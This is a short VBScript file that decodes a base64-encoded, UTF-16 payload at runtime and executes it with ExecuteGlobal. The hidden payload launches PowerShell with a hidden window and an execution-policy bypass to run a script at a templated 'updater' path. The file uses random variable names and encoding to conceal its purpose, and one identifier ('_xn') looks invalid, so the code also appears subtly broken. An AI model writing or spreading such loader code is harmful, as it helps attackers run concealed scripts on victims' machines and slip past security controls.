Dim dhkfqbcr
dhkfqbcr = ""
dhkfqbcr = dhkfqbcr & "TwBwAHQAaQBvAG4AIABFAHgAcABsAGkAYwBpAHQACgBEAGkAbQAgAG8AUwBoAGUA"
dhkfqbcr = dhkfqbcr & "bABsACwAIABzAEMAbQBkAAoAUwBlAHQAIABvAFMAaABlAGwAbAAgAD0AIABDAHIA"
dhkfqbcr = dhkfqbcr & "ZQBhAHQAZQBPAGIAagBlAGMAdAAoACIAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwA"
dhkfqbcr = dhkfqbcr & "bAAiACkACgBzAEMAbQBkACAAPQAgACIAcABvAHcAZQByAHMAaABlAGwAbAAuAGUA"
dhkfqbcr = dhkfqbcr & "eABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ATgBvAG4ASQBuAHQAZQByAGEA"
dhkfqbcr = dhkfqbcr & "YwB0AGkAdgBlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUA"
dhkfqbcr = dhkfqbcr & "bgAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMA"
dhkfqbcr = dhkfqbcr & "cwAgAC0ARgBpAGwAZQAgACIAIgAlACUAVQBQAEQAQQBUAEUAUgBfAFAAUwAxAF8A"
dhkfqbcr = dhkfqbcr & "UABBAFQASAAlACUAIgAiACIACgBvAFMAaABlAGwAbAAuAFIAdQBuACAAcwBDAG0A"
dhkfqbcr = dhkfqbcr & "ZAAsACAAMAAsACAAVAByAHUAZQAKAFMAZQB0ACAAbwBTAGgAZQBsAGwAIAA9ACAA"
dhkfqbcr = dhkfqbcr & "TgBvAHQAaABpAG4AZwA="
Dim asgjkion
Set asgjkion = CreateObject("ADODB.Stream")
asgjkion.Type = 1
asgjkion.Open
Dim _xn : Set _xn = CreateObject("MSXml2.DOMDocument").createElement("z")
_xn.dataType = "bin.base64"
_xn.text = dhkfqbcr
asgjkion.Write _xn.nodeTypedValue
asgjkion.Position = 0
asgjkion.Type = 2
asgjkion.Charset = "UTF-16LE"
Dim bbcqmdzf : bbcqmdzf = asgjkion.ReadText
asgjkion.Close
ExecuteGlobal bbcqmdzf